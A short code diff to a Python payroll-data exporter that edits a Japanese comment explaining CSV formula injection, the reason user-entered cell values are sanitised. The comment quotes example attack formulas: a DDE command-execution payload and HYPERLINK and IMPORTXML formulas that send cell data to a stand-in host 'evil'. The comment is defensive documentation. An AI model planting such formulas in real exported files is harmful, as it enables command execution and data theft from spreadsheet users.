@@ -437,7 +437,7 @@ def payroll_dataframe(
 #: 出力 CSV のセル値はユーザー入力（氏名・資格・園名など）を含むため、
 #: この文字で始まると利用者が Excel で開いた瞬間に実行される。
 #: 代表的な攻撃: ``=cmd|'/c calc'!A1`` / ``=HYPERLINK("http://evil/?d="&A1,"x")``
-#: / ``=IMPORTXML("http://evil/?d="&A1,"//a")``（GAS 経由で持股窃取）。
+#: / ``=IMPORTXML("http://evil/?d="&A1,"//a")``（GAS 経由で外部へのデータ窃取）。
 #:
 #: タブ（``\t``）と carriage return（``\r``）も先頭にあると数式扱いされるため、
 #: 前後に空白がある場合も対象に含める。
